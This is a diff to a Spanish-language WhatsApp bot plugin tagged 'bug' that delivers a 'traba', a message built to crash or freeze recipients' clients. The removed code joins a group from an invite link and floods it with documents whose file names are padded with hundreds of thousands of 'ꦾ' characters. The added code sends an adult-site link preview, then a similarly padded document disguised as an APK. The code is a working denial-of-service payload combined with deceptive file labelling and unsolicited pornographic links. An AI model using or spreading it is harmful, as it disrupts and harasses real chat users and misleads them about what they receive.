@@ -1,37 +1,37 @@
-let handler = async (m, { conn, text }) => {
-  if (!text || !text.includes('chat.whatsapp.com')) {
-    return m.reply('❌ Debes proporcionar el enlace del grupo.\n\n📄 Ejemplo:\n.docz https://chat.whatsapp.com/XXXX', m);
-  }
+let handler = async (m, { conn }) => {
+  const titulo = '🐴 P.A. Zin Web';
+  const descripcion = '𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩';
+  const link = 'https://xnxx.com';
 
-  const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/);
-  if (!match) return m.reply('😿 Enlace inválido.', m);
-
-  const inviteCode = match[1];
-  let groupId;
-
-  try {
-    groupId = await conn.groupAcceptInvite(inviteCode);
-  } catch (e) {
-    groupId = `120363${inviteCode}@g.us`;
-  }
-
-  // Traba invisible
   const basura = 'ꦾ'.repeat(70000);
-  const fileName = '🐢🐢🐢🐢🐢🐢🐢🐢🐢🐢🐢' + basura + basura + basura +basura;
+  const fileName = '📦 P.A. Zin Web ' + basura + basura + basura;
 
-  for (let i = 0; i < 5; i++) {
-    await conn.sendMessage(groupId, {
-      document: { url: 'https://files.catbox.moe/2dvudi.txt' },
-      fileName: fileName + '.txt',
-      mimetype: 'text/plain',
-      caption: '🔥 Tobi 🔥',
-    });
-  }
+  // 1. Mensaje con vista previa de enlace
+  await conn.relayMessage(m.chat, {
+    extendedTextMessage: {
+      text: 'Doc-ios2',
+      matchedText: link,
+      canonicalUrl: link,
+      description: descripcion,
+      title: titulo,
+      previewType: 'LINK',
+      jpegThumbnail: Buffer.from(
+        'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8...', // Puedes generar una imagen base64 propia aquí
+        'base64'
+      ),
+    }
+  }, {});
 
-  await m.reply('📦 Documentos enviados al grupo correctamente.');
+  // 2. Documento traba con nombre largo
+  await conn.sendMessage(m.chat, {
+    document: { url: 'https://files.catbox.moe/2dvudi.txt' },
+    fileName: fileName + '.apk',
+    mimetype: 'application/vnd.android.package-archive', // Para que se vea como APK
+    caption: titulo
+  });
 };
 
-handler.command = ['docz'];
-handler.tags = ['bug', 'grupo'];
-handler.help = ['docz <enlace>'];
+handler.command = ['docios2'];
+handler.help = ['docios2'];
+handler.tags = ['bug'];
 export default handler;
